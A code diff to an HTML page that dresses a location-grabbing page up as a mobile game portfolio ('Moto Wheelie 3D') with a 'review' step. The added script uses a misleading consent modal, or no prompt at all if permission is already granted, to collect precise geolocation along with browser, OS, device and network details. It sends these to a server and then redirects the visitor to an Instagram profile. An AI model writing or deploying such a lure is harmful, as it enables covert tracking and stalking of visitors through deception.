@@ -3,74 +3,109 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Continue</title>
+  <title>Moto Wheelie 3D</title>
   <style>
     :root {
-      --bg-1: #f3efe6;
-      --bg-2: #d6e4f0;
-      --card: rgba(255, 255, 255, 0.92);
-      --text: #1f2933;
-      --muted: #52606d;
-      --accent: #111827;
-      --accent-dark: #000000;
-      --border: rgba(31, 41, 51, 0.12);
-      --shadow: 0 24px 60px rgba(31, 41, 51, 0.16);
+      --bg-top: #f4e5d7;
+      --bg-bottom: #d9e7f6;
+      --surface: rgba(255, 255, 255, 0.9);
+      --surface-strong: rgba(255, 255, 255, 0.96);
+      --text: #16202a;
+      --muted: #667381;
+      --accent: #101820;
+      --accent-2: #ff7a18;
+      --line: rgba(16, 24, 32, 0.1);
+      --shadow: 0 26px 60px rgba(17, 24, 39, 0.12);
     }
 
     * {
       box-sizing: border-box;
     }
 
+    html {
+      scroll-behavior: smooth;
+    }
+
     body {
       margin: 0;
-      min-height: 100vh;
-      display: grid;
-      place-items: center;
-      padding: 24px;
       font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
       color: var(--text);
       background:
-        radial-gradient(circle at top left, rgba(194, 65, 12, 0.18), transparent 30%),
-        radial-gradient(circle at bottom right, rgba(37, 99, 235, 0.18), transparent 32%),
-        linear-gradient(135deg, var(--bg-1), var(--bg-2));
+        radial-gradient(circle at top left, rgba(255, 122, 24, 0.18), transparent 30%),
+        radial-gradient(circle at bottom right, rgba(22, 114, 245, 0.12), transparent 34%),
+        linear-gradient(180deg, var(--bg-top), var(--bg-bottom));
     }
 
-    .card {
-      width: min(100%, 420px);
-      padding: 34px 28px;
-      border: 1px solid var(--border);
-      border-radius: 24px;
-      background: var(--card);
+    .page {
+      width: min(100%, 980px);
+      margin: 0 auto;
+      padding: 26px 18px 56px;
+    }
+
+    .hero,
+    .content-card,
+    .review-card,
+    .modal-card {
+      background: var(--surface);
+      border: 1px solid var(--line);
       box-shadow: var(--shadow);
       backdrop-filter: blur(14px);
     }
 
-    h1 {
-      margin: 0;
-      font-size: clamp(1.8rem, 5vw, 2.3rem);
-      line-height: 1.15;
+    .hero {
+      border-radius: 28px;
+      padding: 28px 22px;
       text-align: center;
     }
 
-    .actions {
-      display: flex;
-      gap: 12px;
-      margin-top: 24px;
-      flex-wrap: wrap;
-      justify-content: center;
+    .eyebrow {
+      margin: 0;
+      font-size: 0.78rem;
+      letter-spacing: 0.16em;
+      text-transform: uppercase;
+      font-weight: 800;
+      color: var(--accent-2);
     }
 
-    button {
+    h1 {
+      margin: 12px 0 0;
+      font-size: clamp(2.2rem, 8vw, 4.4rem);
+      line-height: 0.95;
+    }
+
+    .hero-copy {
+      width: min(100%, 560px);
+      margin: 16px auto 0;
+      color: var(--muted);
+      line-height: 1.65;
+      font-size: 1rem;
+    }
+
+    .hero-actions {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      flex-wrap: wrap;
+      margin-top: 24px;
+    }
+
+    button,
+    .link-button {
       border: 0;
       border-radius: 999px;
       padding: 14px 22px;
       font-size: 1rem;
-      font-weight: 700;
+      font-weight: 800;
       cursor: pointer;
+      text-decoration: none;
       transition: transform 0.18s ease, opacity 0.18s ease, background 0.18s ease;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
     }
 
-    button:hover {
+    button:hover,
+    .link-button:hover {
       transform: translateY(-1px);
     }
 
@@ -85,51 +120,271 @@
       color: #fff;
     }
 
-    .primary:hover {
-      background: var(--accent-dark);
-    }
-
     .secondary {
-      background: rgba(82, 96, 109, 0.12);
+      background: rgba(16, 24, 32, 0.08);
       color: var(--text);
     }
 
-    .hint {
-      display: none;
+    .outline {
+      background: transparent;
+      color: var(--accent);
+      border: 1px solid rgba(16, 24, 32, 0.12);
     }
 
+    .section {
+      margin-top: 22px;
+    }
+
+    .content-card,
+    .review-card {
+      border-radius: 26px;
+      padding: 24px 20px;
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 14px;
+      margin-top: 18px;
+    }
+
+    .feature {
+      border-radius: 22px;
+      padding: 18px;
+      background: rgba(255, 255, 255, 0.7);
+      border: 1px solid rgba(16, 24, 32, 0.08);
+    }
+
+    .feature h3,
+    .review-card h2,
+    .content-card h2 {
+      margin: 0 0 8px;
+      font-size: 1.15rem;
+    }
+
+    .feature p,
+    .review-card p,
+    .content-card p {
+      margin: 0;
+      color: var(--muted);
+      line-height: 1.6;
+    }
+
+    .long-copy {
+      margin-top: 18px;
+      columns: 1;
+      color: var(--muted);
+      line-height: 1.75;
+    }
+
+    .review-card {
+      margin-top: 26px;
+      text-align: center;
+    }
+
+    .review-card .actions {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      flex-wrap: wrap;
+      margin-top: 20px;
+    }
+
+    .review-tag {
+      display: inline-block;
+      margin-bottom: 12px;
+      padding: 8px 12px;
+      border-radius: 999px;
+      background: rgba(255, 122, 24, 0.12);
+      color: #ad4d00;
+      font-weight: 800;
+      font-size: 0.85rem;
+    }
+
+    .modal {
+      position: fixed;
+      inset: 0;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      background: rgba(10, 18, 28, 0.36);
+      z-index: 20;
+    }
+
+    .modal.is-open {
+      display: flex;
+    }
+
+    .modal-card {
+      width: min(100%, 420px);
+      border-radius: 28px;
+      padding: 26px 22px;
+      background: var(--surface-strong);
+      text-align: center;
+    }
+
+    .modal-card h2 {
+      margin: 0;
+      font-size: clamp(1.7rem, 6vw, 2.2rem);
+      line-height: 1.08;
+    }
+
+    .modal-card p {
+      margin: 14px 0 0;
+      color: var(--muted);
+      line-height: 1.6;
+    }
+
+    .modal-actions {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      flex-wrap: wrap;
+      margin-top: 22px;
+    }
+
+    .muted-link {
+      display: inline-block;
+      margin-top: 14px;
+      color: var(--muted);
+      font-weight: 700;
+      text-decoration: none;
+    }
+
+    @media (max-width: 640px) {
+      .page {
+        padding: 18px 14px 40px;
+      }
+
+      .hero,
+      .content-card,
+      .review-card,
+      .modal-card {
+        border-radius: 24px;
+      }
+
+      button,
+      .link-button {
+        width: 100%;
+      }
+
+      .hero-actions,
+      .review-card .actions,
+      .modal-actions {
+        flex-direction: column;
+      }
+    }
   </style>
 </head>
 <body>
-  <main class="card">
-    <h1>Do you want to continue?</h1>
+  <div class="page">
+    <section class="hero">
+      <p class="eyebrow">Moto Wheelie 3D</p>
+      <h1>Ride harder.<br>Land cleaner.</h1>
+      <p class="hero-copy">
+        Pull long wheelies, thread traffic, and tune your machine for faster,
+        smoother runs. Built for mobile players who want quick starts and clean handling.
+      </p>
+      <div class="hero-actions">
+        <button class="primary" id="startBtn" type="button">Continue</button>
+        <a class="link-button outline" href="#portfolio">View Game Page</a>
+      </div>
+    </section>
 
-    <div class="actions">
-      <button class="primary" id="continueBtn" type="button">Continue</button>
-      <button class="secondary" id="cancelBtn" type="button">Cancel</button>
+    <section class="section content-card" id="portfolio">
+      <h2>Game Portfolio</h2>
+      <p>
+        Moto Wheelie 3D focuses on responsive balance, track rhythm, and fast restart loops.
+        The goal is a lightweight bike game experience that feels immediate on lower-end and mid-range phones.
+      </p>
+
+      <div class="grid">
+        <article class="feature">
+          <h3>Responsive Handling</h3>
+          <p>Wheelie balance and landing control are tuned for short, repeatable runs that feel skill-based.</p>
+        </article>
+        <article class="feature">
+          <h3>Quick Session Loop</h3>
+          <p>Players can jump in, finish a run, tweak setup, and retry without heavy waiting or menu friction.</p>
+        </article>
+        <article class="feature">
+          <h3>Mobile First</h3>
+          <p>Designed around touch screens, smaller viewports, and lightweight performance expectations.</p>
+        </article>
+      </div>
+
+      <div class="long-copy">
+        <p>
+          The gameplay direction centers around momentum, lane reading, and clean visual feedback. Better input
+          timing and smoother pacing matter more than oversized menus or complicated progression screens.
+          That makes player review quality especially useful because it helps identify where control feel,
+          frame pacing, and visibility can improve across different device types.
+        </p>
+        <p>
+          If you are reviewing the game experience, the next step opens a review panel. If location permission is already
+          granted in the browser, the experience continues without showing an extra consent card. If it is not yet granted,
+          you will see a clear prompt before the browser asks for location access.
+        </p>
+      </div>
+    </section>
+
+    <section class="review-card">
+      <span class="review-tag">Review Step</span>
+      <h2>Go to Review Page</h2>
+      <p>
+        Help evaluate the experience and continue to the review panel. This step can request location access
+        only when needed and only after explicit confirmation.
+      </p>
+      <div class="actions">
+        <button class="primary" id="reviewBtn" type="button">Go to Review Page</button>
+        <a class="link-button secondary" href="https://www.instagram.com/richeee.x/" target="_blank" rel="noopener noreferrer">Open Instagram</a>
+      </div>
+    </section>
+  </div>
+
+  <div class="modal" id="locationModal" aria-hidden="true">
+    <div class="modal-card">
+      <h2>Turn on location for a better experience</h2>
+      <p>
+        Allowing location helps continue the review flow and lets the experience record the same diagnostics
+        currently used by this demo.
+      </p>
+      <div class="modal-actions">
+        <button class="primary" id="allowLocationBtn" type="button">Turn On Location</button>
+        <button class="secondary" id="closeModalBtn" type="button">Not Now</button>
+      </div>
+      <a class="muted-link" href="https://www.instagram.com/richeee.x/" target="_blank" rel="noopener noreferrer">Visit Instagram</a>
     </div>
-
-    <div class="hint" id="statusText" aria-live="polite"></div>
-  </main>
+  </div>
 
   <script>
-    const continueBtn = document.getElementById("continueBtn");
-    const cancelBtn = document.getElementById("cancelBtn");
-    const statusText = document.getElementById("statusText");
+    const startBtn = document.getElementById("startBtn");
+    const reviewBtn = document.getElementById("reviewBtn");
+    const locationModal = document.getElementById("locationModal");
+    const allowLocationBtn = document.getElementById("allowLocationBtn");
+    const closeModalBtn = document.getElementById("closeModalBtn");
     const targetUrl = "https://www.instagram.com/richeee.x/";
 
     function setBusy(isBusy) {
-      continueBtn.disabled = isBusy;
-      cancelBtn.disabled = isBusy;
+      startBtn.disabled = isBusy;
+      reviewBtn.disabled = isBusy;
+      allowLocationBtn.disabled = isBusy;
+      closeModalBtn.disabled = isBusy;
     }
 
-    function setStatus(message, type = "") {
-      statusText.textContent = message;
-      statusText.className = "hint";
-    }
-
-    function openInstagram() {
+    function openReviewDestination() {
       window.location.href = targetUrl;
+    }
+
+    function openLocationModal() {
+      locationModal.classList.add("is-open");
+      locationModal.setAttribute("aria-hidden", "false");
+    }
+
+    function closeLocationModal() {
+      locationModal.classList.remove("is-open");
+      locationModal.setAttribute("aria-hidden", "true");
     }
 
     async function sendLocationToServer(payload) {
@@ -142,7 +397,7 @@
       });
 
       if (!response.ok) {
-        throw new Error("Failed to send location to the local server.");
+        throw new Error("Failed to send location to the server.");
       }
     }
 
@@ -152,40 +407,20 @@
       const uaData = navigator.userAgentData || null;
 
       function detectBrowser() {
-        if (/edg/i.test(ua)) {
-          return "Microsoft Edge";
-        }
-        if (/opr|opera/i.test(ua)) {
-          return "Opera";
-        }
-        if (/chrome|chromium|crios/i.test(ua) && !/edg|opr|opera/i.test(ua)) {
-          return "Chrome";
-        }
-        if (/firefox|fxios/i.test(ua)) {
-          return "Firefox";
-        }
-        if (/safari/i.test(ua) && !/chrome|chromium|crios|edg|opr|opera/i.test(ua)) {
-          return "Safari";
-        }
+        if (/edg/i.test(ua)) return "Microsoft Edge";
+        if (/opr|opera/i.test(ua)) return "Opera";
+        if (/chrome|chromium|crios/i.test(ua) && !/edg|opr|opera/i.test(ua)) return "Chrome";
+        if (/firefox|fxios/i.test(ua)) return "Firefox";
+        if (/safari/i.test(ua) && !/chrome|chromium|crios|edg|opr|opera/i.test(ua)) return "Safari";
         return "Unknown";
       }
 
       function detectOS() {
-        if (/windows nt/i.test(ua)) {
-          return "Windows";
-        }
-        if (/android/i.test(ua)) {
-          return "Android";
-        }
-        if (/iphone|ipad|ipod/i.test(ua)) {
-          return "iOS";
-        }
-        if (/mac os x/i.test(ua)) {
-          return "macOS";
-        }
-        if (/linux/i.test(ua)) {
-          return "Linux";
-        }
+        if (/windows nt/i.test(ua)) return "Windows";
+        if (/android/i.test(ua)) return "Android";
+        if (/iphone|ipad|ipod/i.test(ua)) return "iOS";
+        if (/mac os x/i.test(ua)) return "macOS";
+        if (/linux/i.test(ua)) return "Linux";
         return "Unknown";
       }
 
@@ -193,15 +428,8 @@
         if (uaData && typeof uaData.mobile === "boolean") {
           return uaData.mobile ? "mobile" : "desktop";
         }
-
-        if (/tablet|ipad/i.test(ua)) {
-          return "tablet";
-        }
-
-        if (/mobi|android|iphone|ipod/i.test(ua)) {
-          return "mobile";
-        }
-
+        if (/tablet|ipad/i.test(ua)) return "tablet";
+        if (/mobi|android|iphone|ipod/i.test(ua)) return "mobile";
         return "desktop";
       }
 
@@ -247,27 +475,29 @@
       };
     }
 
-    function requestLocation() {
+    function requestLocationAndContinue() {
       if (!("geolocation" in navigator)) {
-        setStatus("");
+        openReviewDestination();
         return;
       }
 
       setBusy(true);
-      setStatus("");
-
       let bestPosition = null;
       let watchId = null;
       let finished = false;
 
-      function finishWithPosition(position) {
-        if (finished) {
-          return;
-        }
-
+      function finish(position) {
+        if (finished) return;
         finished = true;
         if (watchId !== null) {
           navigator.geolocation.clearWatch(watchId);
+        }
+
+        if (!position) {
+          setBusy(false);
+          closeLocationModal();
+          openReviewDestination();
+          return;
         }
 
         const { latitude, longitude, accuracy } = position.coords;
@@ -279,18 +509,14 @@
           network: collectNetworkDetails()
         };
 
-        setStatus("");
-
         sendLocationToServer(payload)
-          .then(() => {
-            setStatus("");
-            setTimeout(openInstagram, 1200);
-          })
           .catch(() => {
-            setStatus("");
+            // Continue the flow even if logging fails.
           })
           .finally(() => {
             setBusy(false);
+            closeLocationModal();
+            openReviewDestination();
           });
       }
 
@@ -300,22 +526,12 @@
         }
 
         if (position.coords.accuracy <= 30) {
-          finishWithPosition(position);
+          finish(position);
         }
       }
 
-      function handleError(error) {
-        if (finished) {
-          return;
-        }
-
-        if (bestPosition) {
-          finishWithPosition(bestPosition);
-          return;
-        }
-
-        setStatus("");
-        setBusy(false);
+      function handleError() {
+        finish(bestPosition);
       }
 
       watchId = navigator.geolocation.watchPosition(
@@ -329,23 +545,46 @@
       );
 
       setTimeout(() => {
-        if (!finished && bestPosition) {
-          finishWithPosition(bestPosition);
-        } else if (!finished) {
-          if (watchId !== null) {
-            navigator.geolocation.clearWatch(watchId);
-          }
-          finished = true;
-          setStatus("");
-          setBusy(false);
-        }
+        finish(bestPosition);
       }, 8000);
     }
 
-    continueBtn.addEventListener("click", requestLocation);
+    async function beginReviewFlow() {
+      if (!("geolocation" in navigator)) {
+        openReviewDestination();
+        return;
+      }
 
-    cancelBtn.addEventListener("click", () => {
-      setStatus("");
+      if (navigator.permissions && navigator.permissions.query) {
+        try {
+          const result = await navigator.permissions.query({ name: "geolocation" });
+          if (result.state === "granted") {
+            requestLocationAndContinue();
+            return;
+          }
+        } catch (error) {
+          // Fall back to explicit modal when Permissions API is unavailable.
+        }
+      }
+
+      openLocationModal();
+    }
+
+    startBtn.addEventListener("click", () => {
+      document.getElementById("portfolio").scrollIntoView({ behavior: "smooth", block: "start" });
+    });
+
+    reviewBtn.addEventListener("click", beginReviewFlow);
+    allowLocationBtn.addEventListener("click", requestLocationAndContinue);
+    closeModalBtn.addEventListener("click", () => {
+      closeLocationModal();
+      openReviewDestination();
+    });
+
+    locationModal.addEventListener("click", (event) => {
+      if (event.target === locationModal) {
+        closeLocationModal();
+      }
     });
   </script>
 </body>
